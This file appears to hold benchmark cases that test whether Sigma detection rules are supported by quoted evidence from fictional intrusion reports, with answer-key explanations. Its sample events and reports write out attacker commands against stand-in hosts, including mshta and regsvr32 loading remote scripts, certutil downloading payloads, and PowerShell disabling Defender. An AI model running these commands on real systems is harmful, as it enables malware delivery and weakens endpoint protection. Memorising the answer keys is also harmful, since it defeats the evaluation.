@@ -1,0 +1,511 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "D4",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "mshta.exe C:\\Tools\\HelpDeskPortal.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\helpdesk"
+     },
+     {
+      "cmd": "mshta.exe C:\\LabTools\\about.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\dave"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\notes.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "mshta.exe https://files.cranemail.test/portal/invoice.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\bob\\Documents\\invoice.docm",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "mshta.exe http://files.cranemail.test/portal/invoice2.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "WINWORD.EXE /n C:\\Users\\carol\\Documents\\statement.docm",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "mshta.exe https://files.cranemail.test/portal/invoice.hta",
+    "executed an HTML application payload directly from the network"
+   ],
+   "expected_gate": "G4",
+   "id": "D4-01",
+   "logsource": "windows_process_creation",
+   "report_text": "Incident summary CRANEMAIL-114: the intrusion set we track as Marsh Heron sent invoice-themed emails to finance staff at a regional logistics firm. After the recipient enabled content in the attachment, a child process reached out to the staging host files.cranemail.test and executed an HTML application payload directly from the network. Responders recovered the following command from endpoint telemetry: mshta.exe https://files.cranemail.test/portal/invoice.hta. The HTA file contained a short VBScript stub that wrote a loader to the user's profile and launched it. No additional switches or wrapper scripts were present on the command line. Analysts assess that the operators prefer living-off-the-land binaries because they blend in with ordinary Office activity. The hosting domain was registered nine days before the first email was seen.",
+   "role": "defective",
+   "sigma_yaml": "title: Mshta Loading Remote HTA From Word\nid: 7c1e4a52-3b0d-4f6a-9e21-5d8a0c3b7f14\nstatus: experimental\ndescription: Detects mshta.exe started by winword.exe that loads a remote HTA payload over HTTP or HTTPS.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\mshta.exe'\n    ParentImage|endswith: '\\winword.exe'\n    CommandLine|contains|all:\n      - 'http'\n      - '.hta'\n  condition: selection\nfalsepositives:\n  - Internal line-of-business applications delivered as remote HTA files\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.005"
+   ],
+   "why": "The rule requires ParentImage to end with winword.exe, but that process name appears nowhere in the report text or in either evidence quotation, and no assumption covers it. The other values (mshta.exe, http, .hta) are quoted, so the unsupported parent-process value is the only defect."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D4",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "certutil.exe -hashfile C:\\Users\\alice\\Downloads\\setup.msi SHA256",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "certutil.exe -urlcache * delete",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\helpdesk"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ping.exe 192.0.2.1",
+      "image": "C:\\Windows\\System32\\PING.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "whoami.exe /groups",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://stage.cranemail.test/pack/updsvc.bin C:\\Users\\Public\\updsvc.bin",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c start",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "certutil -urlcache -split -f http://198.51.100.62/pack/cfgd.bin C:\\Users\\Public\\cfgd.bin",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe -NoProfile",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "certutil.exe -urlcache",
+    "http://stage.cranemail.test/pack/updsvc.bin"
+   ],
+   "expected_gate": "G4",
+   "id": "D4-02",
+   "logsource": "windows_process_creation",
+   "report_text": "Hosts compromised in the Quillfeather campaign showed a consistent staging step. Immediately after initial access, the operator used the built-in certificate utility to retrieve a second-stage binary from infrastructure at stage.cranemail.test. Endpoint telemetry captured the full command line as certutil.exe -urlcache -split -f http://stage.cranemail.test/pack/updsvc.bin C:\\Users\\Public\\updsvc.bin on every affected host. The downloaded file was then renamed with an .exe extension and executed from the Public profile directory. Retrieval took place within minutes of the first interactive logon, and no antivirus alert was raised at the time. The behaviour matches the abuse of a trusted Windows utility as a download proxy, a pattern the team has seen in earlier intrusions against the same sector.",
+   "role": "defective",
+   "sigma_yaml": "title: Certutil Urlcache Download With Split Switch\nid: a93f0d6e-52c1-4b87-8f3a-1e6d2b49c7a0\nstatus: experimental\ndescription: Detects certutil.exe used with the urlcache and split switches to download a file over HTTP.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\certutil.exe'\n    CommandLine|contains|all:\n      - '-urlcache'\n      - '-split'\n      - 'http'\n  condition: selection\nfalsepositives:\n  - Administrators retrieving certificate revocation material with certutil\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "The -split switch appears in report_text but inside neither evidence quotation (the quotations are 'certutil.exe -urlcache' and the URL, which skip it), and no assumption covers it. The value is therefore not backed by a verified quotation even though a superficial search of the report would find it; the other values are quoted."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D4",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "powershell.exe -Command Set-MpPreference -ScanAvgCPULoadFactor 30",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\helpdesk"
+     },
+     {
+      "cmd": "powershell.exe -Command Get-MpPreference | Select-Object DisableRealtimeMonitoring",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\helpdesk"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "powershell.exe Get-ChildItem C:\\Temp",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c maint.bat",
+      "user": "LAB\\svc-maint"
+     },
+     {
+      "cmd": "powershell.exe -ExecutionPolicy Bypass -Command Set-MpPreference -DisableRealtimeMonitoring 1",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "svchost.exe -k netsvcs -p -s Schedule",
+      "user": "LAB\\svc-maint"
+     }
+    ]
+   },
+   "evidence": [
+    "powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true"
+   ],
+   "expected_gate": "G4",
+   "id": "D4-03",
+   "logsource": "windows_process_creation",
+   "report_text": "During the Saltmarsh intrusion, the operators weakened endpoint protection shortly after obtaining administrative access, before dropping their remote access tooling. Responders recovered process-creation records showing PowerShell used to change Microsoft Defender preferences. The relevant invocation was powershell.exe -NoProfile -Command Set-MpPreference -DisableRealtimeMonitoring $true, run from a scheduled maintenance script on the file server. The change persisted until the next policy refresh, giving the operators roughly forty minutes of reduced scanning. The Defender operational log recorded the preference change, but no alert was forwarded to the monitoring team. We recommend alerting on attempts to turn off real-time scanning through PowerShell, since legitimate administrators normally manage these settings through central policy rather than ad hoc commands on a server.",
+   "role": "defective",
+   "sigma_yaml": "title: Defender Protection Disabled Via PowerShell Set-MpPreference\nid: 4be8d217-9a35-4c0f-b6e2-83f1a7d05c69\nstatus: experimental\ndescription: Detects PowerShell turning off Microsoft Defender protection features through Set-MpPreference.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1562.001\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - 'Set-MpPreference -DisableRealtimeMonitoring'\n      - 'Set-MpPreference -DisableIOAVProtection'\n  condition: selection\nfalsepositives:\n  - Administrators temporarily disabling real-time scanning during software installation\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1562.001"
+   ],
+   "why": "The CommandLine value list has two alternatives: 'Set-MpPreference -DisableRealtimeMonitoring' is quoted verbatim in the evidence, but 'Set-MpPreference -DisableIOAVProtection' (DisableIOAVProtection) occurs nowhere in the report or the evidence and no assumption covers it. One value is supported and the second is not."
+  },
+  {
+   "assumptions": [
+    {
+     "covers": [
+      "/i:http://"
+     ],
+     "justification": "Scriptlet loaders of this kind are routinely hosted on plain HTTP infrastructure; the report documents only an HTTPS instance.",
+     "statement": "The loader may also be staged over plain HTTP on alternate hosts, and it is paired with the standard script component runtime library scrobj.dll."
+    }
+   ],
+   "defect_class": "D4",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "regsvr32.exe /s C:\\LabCodec\\codec.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /i codec.msi",
+      "user": "LAB\\SYSTEM"
+     },
+     {
+      "cmd": "regsvr32.exe /u /s scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c hardening.bat",
+      "user": "LAB\\secops"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "ipconfig.exe /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "net.exe user",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "regsvr32 /s /n /u /i:http://198.51.100.23/cdn/a.sct scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct",
+    "pointed at a scriptlet hosted on sync.cranemail.test"
+   ],
+   "expected_gate": "G4",
+   "id": "D4-04",
+   "logsource": "windows_process_creation",
+   "report_text": "Telemetry from the Ironpine intrusion shows the actor using regsvr32.exe as a proxy to run remote script content on engineering workstations. The binary was started by a short-lived command shell and pointed at a scriptlet hosted on sync.cranemail.test. Because the process audit record was truncated, responders could only reconstruct the leading part of the call as regsvr32.exe /s /n /u /i:https://sync.cranemail.test/cdn/update.sct, which loads the remote file without registering anything on disk. The scriptlet in turn launched a staged loader from the user's temporary directory. Since the request goes out over HTTPS from a signed Windows binary, perimeter controls did not flag it. Our recommendation is a process-creation detection that keys on the remote scriptlet being passed on the command line, as the technique leaves little other trace on the host.",
+   "role": "defective",
+   "sigma_yaml": "title: Regsvr32 Remote Scriptlet Execution\nid: e05a7b31-6d84-4a29-9c17-2f3b8e4d1a56\nstatus: experimental\ndescription: Detects regsvr32.exe loading a remote scriptlet through the /i switch together with the script component runtime.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.010\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\regsvr32.exe'\n  selection_url:\n    CommandLine|contains:\n      - '/i:https://'\n      - '/i:http://'\n  selection_dll:\n    CommandLine|contains: 'scrobj.dll'\n  condition: selection_img and selection_url and selection_dll\nfalsepositives:\n  - Software installers registering components from a network share\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.010"
+   ],
+   "why": "The value scrobj.dll is not in the evidence quotation (the cited command line is truncated before it) and is not in the covers of the declared assumption. The assumption's prose mentions scrobj.dll, but its covers list contains only '/i:http://', so the contract's covers test is not met for scrobj.dll. The other values are supported by the quotation or by the covers list."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D4",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "dest_ip": "198.51.100.40",
+      "dest_port": "8443",
+      "image": "C:\\Windows\\System32\\wscript.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.60",
+      "dest_port": "8443",
+      "image": "C:\\Program Files\\LabAgent\\agent.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "negative": [
+     {
+      "dest_ip": "198.51.100.10",
+      "dest_port": "443",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "192.0.2.15",
+      "dest_port": "443",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "network_connect"
+     }
+    ],
+    "positive": [
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8443",
+      "image": "C:\\Windows\\System32\\wscript.exe",
+      "kind": "network_connect"
+     },
+     {
+      "dest_ip": "203.0.113.77",
+      "dest_port": "8443",
+      "image": "C:\\Windows\\SysWOW64\\wscript.exe",
+      "kind": "network_connect"
+     }
+    ]
+   },
+   "evidence": [
+    "the implant connected to 203.0.113.77 on TCP port 8443 at intervals of roughly sixty seconds",
+    "The port is not associated with any approved business application in the affected subnet."
+   ],
+   "expected_gate": "G4",
+   "id": "D4-05",
+   "logsource": "windows_network_connection",
+   "report_text": "Network telemetry from the Larkspur incident shows an implant beaconing to a single external address over a non-standard port. Every outbound session in the sample used the same destination: the implant connected to 203.0.113.77 on TCP port 8443 at intervals of roughly sixty seconds, sending short fixed-size requests and receiving small replies. The port is not associated with any approved business application in the affected subnet. The connections originated from a script host process launched through the user's startup items, which explains why the activity resumed after each reboot. No domain name was used; the operators addressed the server by IP only, which suggests the infrastructure was provisioned for short-term use and will rotate quickly.",
+   "role": "defective",
+   "sigma_yaml": "title: Script Host Beaconing To Non-Standard Port\nid: 18d6c9f4-0e7b-4f52-a3d9-b74c26e18f03\nstatus: experimental\ndescription: Detects wscript.exe connecting to 203.0.113.77 on TCP port 8443.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1571\nlogsource:\n  category: network_connection\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\wscript.exe'\n    DestinationIp: '203.0.113.77'\n    DestinationPort: '8443'\n  condition: selection\nfalsepositives:\n  - Administrative scripts contacting a management service on the same address\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1571"
+   ],
+   "why": "The rule restricts Image to wscript.exe, a process name that does not occur anywhere in the report (which says only 'a script host process') or in the evidence quotations, and no assumption covers it. The destination IP and port are quoted verbatim, so the tool name taken from outside knowledge is the single unsupported value."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D4",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "dns_query",
+      "name": "app.telemetry-sync.vendor.example"
+     },
+     {
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "dns_query",
+      "name": "ocsp.certs-sample.example"
+     }
+    ],
+    "negative": [
+     {
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "dns_query",
+      "name": "news.contoso-sample.example"
+     },
+     {
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "kind": "dns_query",
+      "name": "time.sample-ntp.test"
+     }
+    ],
+    "positive": [
+     {
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "dns_query",
+      "name": "a1b2c3d4e5.telemetry-sync.example-cdn.test"
+     },
+     {
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "dns_query",
+      "name": "7f3k9x2m1q.telemetry-sync.example-cdn.test"
+     }
+    ]
+   },
+   "evidence": [
+    "lookups for generated subdomains of telemetry-sync.example-cdn.test, for example a1b2c3d4e5.telemetry-sync.example-cdn.test"
+   ],
+   "expected_gate": "G4",
+   "id": "D4-06",
+   "logsource": "windows_dns_query",
+   "report_text": "Resolver and endpoint telemetry from the Driftwood case describe DNS-based command and control from a user workstation. A loader executed through rundll32.exe issued a steady stream of lookups for generated subdomains of telemetry-sync.example-cdn.test, for example a1b2c3d4e5.telemetry-sync.example-cdn.test, with the subdomain label carrying encoded task data. Lookups occurred every few minutes and were answered with short responses relayed through the recursive resolver. No other process on the host queried the domain. The domain has no legitimate business use for the organisation and does not appear in any vendor allow list. Responders blocked it at the resolver on day three, after which the beaconing stopped. The campaign is assessed as low in sophistication but persistent.",
+   "role": "defective",
+   "sigma_yaml": "title: Rundll32 DNS Beaconing To Generated Subdomains\nid: c2f47a80-1b95-4d3e-8a6c-09e5d7b31f28\nstatus: experimental\ndescription: Detects rundll32.exe resolving generated subdomains of telemetry-sync.example-cdn.test.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1071.004\nlogsource:\n  category: dns_query\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\rundll32.exe'\n    QueryName|endswith: '.telemetry-sync.example-cdn.test'\n  condition: selection\nfalsepositives:\n  - Security staff testing the blocked domain from a sandbox\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1071.004"
+   ],
+   "why": "The Image value rundll32.exe appears in report_text ('A loader executed through rundll32.exe') but not inside the single evidence quotation, which covers only the domain, and no assumption covers it. The domain suffix is quoted, so the process name is the one value lacking a verified quotation."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "D4",
+   "evasive": true,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "schtasks.exe /create /tn LabBackupNightly /sc daily /st 02:00 /tr C:\\LabBackup\\backup.exe",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\backupadmin"
+     },
+     {
+      "cmd": "schtasks.exe /create /tn HelpdeskInventory /sc minute /mo 30 /tr C:\\Tools\\inventory.exe",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\helpdesk"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "hostname.exe",
+      "image": "C:\\Windows\\System32\\HOSTNAME.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "tasklist.exe /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "schtasks.exe /create /tn OneDriveSyncHelper /sc minute /mo 5 /tr C:\\Users\\Public\\Libraries\\syncsvc.exe",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "schtasks /create /tn WinSyncUpdate /sc minute /mo 10 /tr C:\\Users\\Public\\Libraries\\wupd.exe",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe -NoProfile",
+      "user": "LAB\\carol"
+     }
+    ]
+   },
+   "evidence": [
+    "schtasks.exe /create /tn OneDriveSyncHelper /sc minute /mo 5 /tr C:\\Users\\Public\\Libraries\\syncsvc.exe"
+   ],
+   "expected_gate": "G4",
+   "id": "D4-07",
+   "logsource": "windows_process_creation",
+   "report_text": "Persistence in the Tidewater intrusion relied on a scheduled task created from a command shell on a jump server. The operators registered a task named OneDriveSyncHelper that executes a renamed payload from the Public profile every five minutes. Responders recovered the creation command from process telemetry: schtasks.exe /create /tn OneDriveSyncHelper /sc minute /mo 5 /tr C:\\Users\\Public\\Libraries\\syncsvc.exe. The task survived reboots and was re-created by the operators when administrators removed it on the second day. The payload path sits in a directory that is writable by all local users, which is common for commodity loaders. No scheduled task with this name appears in the software inventory for the server, and the host's change records contain no corresponding request.",
+   "role": "defective",
+   "sigma_yaml": "title: Scheduled Task Created Every Minute Pointing At Public Libraries\nid: 6a39e1d5-b8c2-47f0-9d14-e3a5c80b72f6\nstatus: experimental\ndescription: Detects schtasks.exe creating a minute-interval task that runs a payload from the Public Libraries directory.\nreferences:\n  - urn:atidep:case\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.privilege_escalation\n  - attack.t1053.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\Windows\\System32\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/create'\n      - '/sc minute'\n      - '\\Users\\Public\\Libraries'\n  condition: selection\nfalsepositives:\n  - Software that installs a polling task into the Public profile\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1053.005"
+   ],
+   "why": "The Image value '\\Windows\\System32\\schtasks.exe' contains a directory path that is in neither the report nor the evidence quotation; the quotation supports only the bare file name schtasks.exe. No assumption covers the path, so the full condition value is not traceable even though its final component is quoted. The remaining values are quoted."
+  }
+ ]
+}
